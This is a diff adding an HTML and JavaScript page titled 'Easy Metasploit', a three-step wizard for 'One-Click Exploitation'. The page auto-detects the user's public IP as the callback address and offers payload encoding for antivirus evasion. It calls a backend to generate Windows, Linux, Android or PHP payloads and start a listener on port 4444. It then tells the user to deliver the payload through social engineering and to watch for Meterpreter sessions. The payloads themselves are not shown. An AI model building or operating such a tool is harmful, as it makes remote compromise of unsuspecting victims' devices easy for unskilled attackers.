@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Easy Metasploit - Atoms.Ninja</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        .easy-container {
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 20px;
+        }
+        
+        .wizard-card {
+            background: rgba(17, 24, 39, 0.5);
+            border: 1px solid rgba(139, 92, 246, 0.3);
+            border-radius: 16px;
+            padding: 40px;
+            margin-bottom: 30px;
+        }
+        
+        .step {
+            display: none;
+        }
+        
+        .step.active {
+            display: block;
+        }
+        
+        .step-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        .step-number {
+            display: inline-block;
+            width: 60px;
+            height: 60px;
+            line-height: 60px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #8B5CF6, #6366F1);
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        
+        .step-title {
+            color: #F3F4F6;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        
+        .step-description {
+            color: #9CA3AF;
+            font-size: 16px;
+        }
+        
+        .platform-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .platform-card {
+            background: rgba(17, 24, 39, 0.8);
+            border: 2px solid rgba(139, 92, 246, 0.2);
+            border-radius: 12px;
+            padding: 30px 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .platform-card:hover {
+            border-color: #8B5CF6;
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(139, 92, 246, 0.3);
+        }
+        
+        .platform-card.selected {
+            border-color: #8B5CF6;
+            background: rgba(139, 92, 246, 0.1);
+        }
+        
+        .platform-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+        
+        .platform-name {
+            color: #F3F4F6;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+        
+        .platform-desc {
+            color: #9CA3AF;
+            font-size: 13px;
+        }
+        
+        .ip-display {
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid #10B981;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .ip-label {
+            color: #9CA3AF;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        
+        .ip-value {
+            color: #10B981;
+            font-size: 24px;
+            font-weight: bold;
+            font-family: monospace;
+        }
+        
+        .button-group {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin-top: 40px;
+        }
+        
+        .btn-wizard {
+            padding: 15px 40px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: none;
+        }
+        
+        .btn-wizard.primary {
+            background: linear-gradient(135deg, #8B5CF6, #6366F1);
+            color: white;
+        }
+        
+        .btn-wizard.secondary {
+            background: rgba(139, 92, 246, 0.1);
+            border: 1px solid #8B5CF6;
+            color: #A78BFA;
+        }
+        
+        .btn-wizard:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(139, 92, 246, 0.4);
+        }
+        
+        .btn-wizard:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .progress-bar {
+            height: 8px;
+            background: rgba(139, 92, 246, 0.2);
+            border-radius: 4px;
+            margin-bottom: 30px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #8B5CF6, #6366F1);
+            transition: width 0.3s;
+            border-radius: 4px;
+        }
+        
+        .result-box {
+            background: rgba(17, 24, 39, 0.8);
+            border: 1px solid rgba(139, 92, 246, 0.3);
+            border-radius: 12px;
+            padding: 30px;
+            margin: 20px 0;
+        }
+        
+        .result-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px;
+            background: rgba(17, 24, 39, 0.5);
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+        
+        .result-label {
+            color: #9CA3AF;
+            font-size: 14px;
+        }
+        
+        .result-value {
+            color: #10B981;
+            font-family: monospace;
+            font-weight: 600;
+        }
+        
+        .copy-btn {
+            padding: 8px 16px;
+            background: rgba(139, 92, 246, 0.2);
+            border: 1px solid #8B5CF6;
+            border-radius: 6px;
+            color: #A78BFA;
+            cursor: pointer;
+            font-size: 13px;
+            transition: all 0.3s;
+        }
+        
+        .copy-btn:hover {
+            background: rgba(139, 92, 246, 0.4);
+        }
+        
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(139, 92, 246, 0.3);
+            border-top-color: #8B5CF6;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .status-badge {
+            display: inline-block;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        
+        .status-badge.success {
+            background: rgba(16, 185, 129, 0.2);
+            color: #10B981;
+        }
+        
+        .status-badge.warning {
+            background: rgba(251, 191, 36, 0.2);
+            color: #FCD34D;
+        }
+        
+        .status-badge.error {
+            background: rgba(239, 68, 68, 0.2);
+            color: #EF4444;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="logo">
+                <img src="/logo.png" alt="Atoms Ninja" class="logo-icon" style="width: 40px; height: 40px; border-radius: 8px;">
+                <span class="logo-text">Atoms.Ninja</span>
+            </div>
+            <nav class="nav">
+                <a href="/" class="nav-link">Home</a>
+                <a href="/metasploit.html" class="nav-link">Advanced</a>
+                <a href="/metasploit-easy.html" class="nav-link active">Easy Mode</a>
+            </nav>
+        </header>
+
+        <div class="easy-container">
+            <div class="hero" style="text-align: center; padding: 40px 0;">
+                <div class="badge">🚀 EASY MODE</div>
+                <h1 class="hero-title">One-Click Exploitation</h1>
+                <p class="hero-description">Generate payloads and start listeners in 3 easy steps</p>
+            </div>
+
+            <div class="wizard-card">
+                <!-- Progress Bar -->
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressBar" style="width: 33%"></div>
+                </div>
+
+                <!-- Step 1: Platform Selection -->
+                <div class="step active" id="step1">
+                    <div class="step-header">
+                        <div class="step-number">1</div>
+                        <h2 class="step-title">Choose Your Target Platform</h2>
+                        <p class="step-description">Select the operating system of your target</p>
+                    </div>
+
+                    <div class="platform-grid">
+                        <div class="platform-card" onclick="selectPlatform('windows')">
+                            <div class="platform-icon">💻</div>
+                            <div class="platform-name">Windows</div>
+                            <div class="platform-desc">Desktop & Server</div>
+                        </div>
+                        <div class="platform-card" onclick="selectPlatform('linux')">
+                            <div class="platform-icon">🐧</div>
+                            <div class="platform-name">Linux</div>
+                            <div class="platform-desc">Servers & IoT</div>
+                        </div>
+                        <div class="platform-card" onclick="selectPlatform('android')">
+                            <div class="platform-icon">📱</div>
+                            <div class="platform-name">Android</div>
+                            <div class="platform-desc">Mobile Devices</div>
+                        </div>
+                        <div class="platform-card" onclick="selectPlatform('php')">
+                            <div class="platform-icon">🌐</div>
+                            <div class="platform-name">PHP</div>
+                            <div class="platform-desc">Web Servers</div>
+                        </div>
+                    </div>
+
+                    <div class="button-group">
+                        <button class="btn-wizard primary" onclick="nextStep()" id="step1Next" disabled>
+                            Continue →
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Step 2: Configuration -->
+                <div class="step" id="step2">
+                    <div class="step-header">
+                        <div class="step-number">2</div>
+                        <h2 class="step-title">Configure Your Attack</h2>
+                        <p class="step-description">We'll auto-detect your IP and configure everything</p>
+                    </div>
+
+                    <div class="ip-display">
+                        <div class="ip-label">Your Public IP Address</div>
+                        <div class="ip-value" id="detectedIp">Detecting...</div>
+                    </div>
+
+                    <div style="margin: 30px 0;">
+                        <label style="display: flex; align-items: center; color: #D1D5DB; font-size: 16px; cursor: pointer;">
+                            <input type="checkbox" id="encodePayload" checked style="width: 20px; height: 20px; margin-right: 10px;">
+                            <span>🛡️ Encode payload for antivirus evasion (Recommended)</span>
+                        </label>
+                    </div>
+
+                    <div class="button-group">
+                        <button class="btn-wizard secondary" onclick="prevStep()">
+                            ← Back
+                        </button>
+                        <button class="btn-wizard primary" onclick="nextStep()">
+                            Generate →
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Step 3: Generating -->
+                <div class="step" id="step3">
+                    <div class="step-header">
+                        <div class="step-number">3</div>
+                        <h2 class="step-title">🔨 Creating Your Exploit</h2>
+                        <p class="step-description">Please wait while we generate your payload and setup the listener...</p>
+                    </div>
+
+                    <div style="text-align: center; padding: 60px 0;">
+                        <div class="loading-spinner" style="width: 60px; height: 60px; border-width: 6px;"></div>
+                        <p style="color: #9CA3AF; margin-top: 30px; font-size: 18px;" id="generationStatus">
+                            Initializing...
+                        </p>
+                    </div>
+                </div>
+
+                <!-- Step 4: Results -->
+                <div class="step" id="step4">
+                    <div class="step-header">
+                        <div class="step-number">✓</div>
+                        <h2 class="step-title">🎉 Ready to Deploy!</h2>
+                        <p class="step-description">Your exploit is ready. Follow the instructions below.</p>
+                    </div>
+
+                    <div class="result-box">
+                        <h3 style="color: #A78BFA; margin-bottom: 20px;">📦 Payload Information</h3>
+                        
+                        <div class="result-item">
+                            <div>
+                                <div class="result-label">Payload File</div>
+                                <div class="result-value" id="resultFilename">-</div>
+                            </div>
+                            <button class="copy-btn" onclick="downloadPayload()">📥 Download</button>
+                        </div>
+
+                        <div class="result-item">
+                            <div>
+                                <div class="result-label">File Size</div>
+                                <div class="result-value" id="resultSize">-</div>
+                            </div>
+                        </div>
+
+                        <div class="result-item">
+                            <div>
+                                <div class="result-label">Listener Status</div>
+                                <div class="result-value">
+                                    <span class="status-badge success" id="listenerStatus">🎧 Active</span>
+                                </div>
+                            </div>
+                            <button class="copy-btn" onclick="checkSessions()">🔍 Check Sessions</button>
+                        </div>
+                    </div>
+
+                    <div class="result-box">
+                        <h3 style="color: #A78BFA; margin-bottom: 20px;">🚀 Next Steps</h3>
+                        
+                        <div style="background: rgba(17, 24, 39, 0.5); padding: 20px; border-radius: 8px; margin-bottom: 15px;">
+                            <div style="color: #FCD34D; font-weight: 600; margin-bottom: 10px;">1. Download the payload</div>
+                            <div style="color: #9CA3AF; font-size: 14px;">Click the download button above to get your payload file</div>
+                        </div>
+
+                        <div style="background: rgba(17, 24, 39, 0.5); padding: 20px; border-radius: 8px; margin-bottom: 15px;">
+                            <div style="color: #FCD34D; font-weight: 600; margin-bottom: 10px;">2. Deliver to target</div>
+                            <div style="color: #9CA3AF; font-size: 14px;">Use social engineering or authorized methods to deliver the payload</div>
+                        </div>
+
+                        <div style="background: rgba(17, 24, 39, 0.5); padding: 20px; border-radius: 8px;">
+                            <div style="color: #FCD34D; font-weight: 600; margin-bottom: 10px;">3. Wait for connection</div>
+                            <div style="color: #9CA3AF; font-size: 14px;">When the target executes the payload, you'll get a session. Check status regularly.</div>
+                        </div>
+                    </div>
+
+                    <div class="button-group">
+                        <button class="btn-wizard secondary" onclick="location.reload()">
+                            🔄 Start Over
+                        </button>
+                        <button class="btn-wizard primary" onclick="checkSessions()">
+                            🎯 View Sessions
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Sessions Panel -->
+            <div class="wizard-card" id="sessionsPanel" style="display: none;">
+                <h3 style="color: #A78BFA; margin-bottom: 20px;">🎯 Active Sessions</h3>
+                <div id="sessionsList"></div>
+            </div>
+        </div>
+    </div>
+
+    <script src="config.js"></script>
+    <script>
+        let currentStep = 1;
+        let selectedPlatform = '';
+        let detectedIp = '';
+        let jobId = null;
+        let payloadData = null;
+
+        const API_BASE = window.appConfig?.KALI_MCP_ENDPOINT || 'http://localhost:3001';
+
+        // Detect IP on load
+        async function detectIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                detectedIp = data.ip;
+                document.getElementById('detectedIp').textContent = detectedIp;
+            } catch (error) {
+                document.getElementById('detectedIp').textContent = 'Auto-detection failed';
+                detectedIp = prompt('Please enter your public IP address:') || '0.0.0.0';
+                document.getElementById('detectedIp').textContent = detectedIp;
+            }
+        }
+
+        function selectPlatform(platform) {
+            selectedPlatform = platform;
+            
+            // Update UI
+            document.querySelectorAll('.platform-card').forEach(card => {
+                card.classList.remove('selected');
+            });
+            event.target.closest('.platform-card').classList.add('selected');
+            
+            document.getElementById('step1Next').disabled = false;
+        }
+
+        function nextStep() {
+            if (currentStep === 1 && !selectedPlatform) {
+                alert('Please select a platform');
+                return;
+            }
+
+            if (currentStep === 2) {
+                // Start generation
+                generateExploit();
+            }
+
+            document.getElementById(`step${currentStep}`).classList.remove('active');
+            currentStep++;
+            document.getElementById(`step${currentStep}`).classList.add('active');
+            
+            updateProgress();
+        }
+
+        function prevStep() {
+            document.getElementById(`step${currentStep}`).classList.remove('active');
+            currentStep--;
+            document.getElementById(`step${currentStep}`).classList.add('active');
+            
+            updateProgress();
+        }
+
+        function updateProgress() {
+            const progress = (currentStep / 4) * 100;
+            document.getElementById('progressBar').style.width = progress + '%';
+        }
+
+        async function generateExploit() {
+            const statusEl = document.getElementById('generationStatus');
+            
+            try {
+                statusEl.textContent = '🔨 Generating payload...';
+                
+                const encode = document.getElementById('encodePayload').checked;
+                
+                const response = await fetch(`${API_BASE}/api/quick-setup`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        platform: selectedPlatform,
+                        lhost: detectedIp,
+                        lport: 4444,
+                        encode: encode
+                    })
+                });
+
+                const data = await response.json();
+                
+                if (data.success) {
+                    payloadData = data.payload;
+                    jobId = data.jobId;
+                    
+                    statusEl.textContent = '✅ Complete! Preparing results...';
+                    
+                    setTimeout(() => {
+                        showResults(data);
+                    }, 1000);
+                } else {
+                    throw new Error(data.error || 'Generation failed');
+                }
+                
+            } catch (error) {
+                statusEl.textContent = `❌ Error: ${error.message}`;
+                setTimeout(() => {
+                    prevStep();
+                }, 3000);
+            }
+        }
+
+        function showResults(data) {
+            document.getElementById('resultFilename').textContent = data.payload.name;
+            document.getElementById('resultSize').textContent = formatBytes(data.payload.size);
+            
+            nextStep();
+        }
+
+        async function downloadPayload() {
+            if (!payloadData) return;
+            
+            const downloadUrl = `${API_BASE}${payloadData.downloadUrl}`;
+            window.open(downloadUrl, '_blank');
+        }
+
+        async function checkSessions() {
+            if (!jobId) return;
+            
+            try {
+                const response = await fetch(`${API_BASE}/api/listener/status/${jobId}`);
+                const data = await response.json();
+                
+                const panel = document.getElementById('sessionsPanel');
+                const list = document.getElementById('sessionsList');
+                
+                if (data.status === 'running') {
+                    panel.style.display = 'block';
+                    
+                    // Parse sessions from log
+                    const sessions = parseSessionsFromLog(data.log);
+                    
+                    if (sessions.length > 0) {
+                        list.innerHTML = sessions.map(s => `
+                            <div class="result-item">
+                                <div>
+                                    <div class="result-label">Session ${s.id}</div>
+                                    <div class="result-value">${s.info}</div>
+                                </div>
+                                <span class="status-badge success">Active</span>
+                            </div>
+                        `).join('');
+                    } else {
+                        list.innerHTML = '<div style="color: #9CA3AF; text-align: center; padding: 20px;">No sessions yet. Waiting for connections...</div>';
+                    }
+                } else {
+                    alert('Listener is not running');
+                }
+                
+            } catch (error) {
+                alert('Error checking sessions: ' + error.message);
+            }
+        }
+
+        function parseSessionsFromLog(log) {
+            // Simple parser - would need enhancement for production
+            const sessions = [];
+            const lines = log.split('\n');
+            
+            for (let line of lines) {
+                if (line.includes('Meterpreter session') || line.includes('Command shell session')) {
+                    sessions.push({
+                        id: sessions.length + 1,
+                        info: line.trim()
+                    });
+                }
+            }
+            
+            return sessions;
+        }
+
+        function formatBytes(bytes) {
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
+        }
+
+        // Auto-detect IP on page load
+        detectIP();
+    </script>
+</body>
+</html>
